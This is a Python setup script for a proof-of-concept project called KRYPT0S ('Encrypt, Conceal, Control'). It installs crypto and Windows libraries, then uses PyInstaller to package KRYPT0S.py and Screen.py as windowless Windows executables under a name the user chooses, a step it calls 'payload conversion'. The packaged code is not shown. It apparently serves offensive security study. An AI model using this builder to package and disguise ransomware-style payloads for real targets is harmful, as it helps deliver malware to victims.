# ========================================================================================
#  KRYPTOS - Encrypt, Conceal, Control (A proof of concept project)
#
#  CREATED BY PHANTOM0004 (All rights reserved)
#  Check out my penetration testing repo! -> https://github.com/phantom0004/PenTest_Vault
# ========================================================================================
# This is the setup tool for KRYPT0S, will convert all .py files to .exe files for Windows
# ========================================================================================
import subprocess
import os
import shutil

def parse_pip_output(pip_output, library_name):
    if "Successfully installed" in pip_output:
        return f"[+] Successfully installed {library_name}!"
    elif "Requirement already satisfied" in pip_output:
        return f"[!] Library {library_name} already installed."
    elif "Defaulting to user installation because normal site-packages is not writeable" in pip_output:
        return f"[!] {library_name} installed in user site-packages due to permission issues."
    else:
        return f"[-] Unable to parse PIP output for {library_name}. The below snippet log was captured : {pip_output[:40]}"

def check_os():
    if os.name != 'nt':
        print("[-] OS ERROR")
        print("You are not running a Windows OS.")
        print("Converting a .py to a .exe file from a non-Windows OS will result in creating an executable for that system.")
        print("This is not a script limitation but a general limitation found in all conversion systems.")
        print("To run this successfully, ensure the OS you are running this script on is a Windows machine.")
        
        exit()
        
    print(f"[\u2714] You are running the script on a Windows OS \n")
    
def download_library(libraries):
    print("[*] Checking and downloading required PIP libraries")
    for library in libraries:
        command = ["pip", "install", library]
        try:
            result = subprocess.run(command, capture_output=True, text=True)
            output = result.stdout + result.stderr
            print(parse_pip_output(output, library))
        except Exception as err:
            print(f"[-] Unable to install {library}! Error: {err}. Skipping...")
            
def libraries_check_section():
    libraries = ["pycryptodome", "requests", "pywin32", "pyinstaller"]
    
    print("PIP LIBRARY INSTALLATION - Downloading required libraries . . . \n")
    download_library(libraries)
    print("\nLIBRARY INSTALLATION COMPLETED\n")

def payload_conversion():
    names = ["KRYPT0S.py", "Screen.py"]
    
    output_dir = "krypt0s_output_conversion"
    if not os.path.exists(output_dir):
        try:
            os.mkdir(output_dir)
        except Exception as e:
            exit(f"Error when creating output directory. Please create a directory named '{output_dir}' manually in the same directory to bypass this problem. Error: {e}")
    
    try:
        os.chdir(output_dir)
    except Exception as err:
        exit(f"Unable to change to '{output_dir}' directory. Ensure it has been created and is found in this directory before continuing. Error: {err}")
    
    file_name = input("Enter a custom name for the executable file of KRYPT0S.py (without .exe) -> ").strip()
    if not file_name:
        file_name = "KRYPT0S"
        
    for name in names:
        current_file_name = file_name if name == "KRYPT0S.py" else "Screen"
        command = [
            "pyinstaller",
            "--onefile",
            "--name",
            current_file_name,
            "--noconsole",
            f"../{name}"
        ]

        print(f"\n[!] Processing the conversion of '{current_file_name}'. Please stand by, this may take some time.")
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
    
        if result.returncode == 0:
            print(f"[+] File {name} has been converted to {current_file_name}.exe.")
        else:
            print(f"[-] A fatal error occurred, below is the error log: \n\n{result.stderr}\n")
            print("Tips to fix this issue :\n[1] Ensure the .py files are NOT inside a custom folder, if so put them outside\n[2] Reinstall 'pyinstaller' with PIP if the issue persists")
            exit("\nIf the issue is still not fixed open an issue on KRYPT0S repo for further evaluation.\nAlternitivley manually convert the files with 'pyinstaller' tool!")
        
        clean_pyinstaller_artifacts(current_file_name)
        
    print("\n[*] Conversion Completed. Please check the 'krypt0s_output_conversion' folder to view the output")

def clean_pyinstaller_artifacts(executable_name):
    # Define paths
    build_dir = 'build'
    pycache_dir = '__pycache__'
    dist_dir = 'dist'
    spec_file = f'{executable_name}.spec'
    executable_path = os.path.join(dist_dir, f'{executable_name}.exe')
    new_executable_path = f'{executable_name}.exe'
    
    # Delete build directory
    if os.path.exists(build_dir):
        try:
            shutil.rmtree(build_dir)
        except Exception as e:
            print(f"Unable to delete the following directory: {build_dir}. Error: {e}")
    
    # Delete __pycache__ directory
    if os.path.exists(pycache_dir):
        try:
            shutil.rmtree(pycache_dir)
        except Exception as e:
            print(f"Unable to delete the following directory: {pycache_dir}. Error: {e}")
    
    # Delete the spec file
    if os.path.exists(spec_file):
        try:
            os.remove(spec_file)
        except Exception as e:
            print(f"Unable to delete the following file: {spec_file}. Error: {e}")
    
    # Move the executable to the current directory
    if os.path.exists(executable_path):
        try:
            shutil.move(executable_path, new_executable_path)
        except Exception as e:
            print(f"Unable to move executable file {executable_name} to: {new_executable_path}. Error: {e}")
    
    # Delete dist directory
    if os.path.exists(dist_dir):
        try:        
            shutil.rmtree(dist_dir)
        except Exception as e:
            print(f"Unable to delete the following directory: {dist_dir}. Error: {e}")
    
    print(f"[*] Cleanup completed for {executable_name}")
    print() # New line

def banner():
    print(r"""
         _  ________   _______ ____   ___  ____    ____  _____ _____ _   _ ____  
        | |/ /  _ \ \ / /_   _|  _ \ / _ \/ ___|  / ___|| ____|_   _| | | |  _ \ 
        | ' /| |_) \ V /  | | | |_) | | | \___ \  \___ \|  _|   | | | | | | |_) |
        | . \|  _ < | |   | | |  __/| |_| |___) |  ___) | |___  | | | |_| |  __/ 
     ___|_|\_\_| \_\|_|   |_| |_|    \___/|____/  |____/|_____| |_|  \___/|_|   
                          ---- Still undergoing testing, may encounter issues
    """)
    
def clear_screen():
    try:
        os.system("cls")
    except:
       pass

def warning_message():
    clear_screen() # Remove above clutter
    print("!WARNING! Before continuing, please ensure the following: \n")
    print("1) You have the necessary permissions for basic installation tasks.")
    print("2) You have NOT renamed the KRYPT0S Python file or the Screen Python file. The setup file will allow you to do this.")
    print("3) The setup file is in the same directory as Screen.py and KRYPT0S.py.")
    
    input("\nPress any key to continue if you agree to the above ... ")
    
    clear_screen() # Remove warning message
    banner() # Show banner after

def main():
    # Show warning message
    warning_message()

    # Check OS to see if it is Windows or not
    check_os()

    # Install required libraries needed
    libraries_check_section()

    # Start payload conversion
    payload_conversion()

if __name__ == '__main__':
    main()
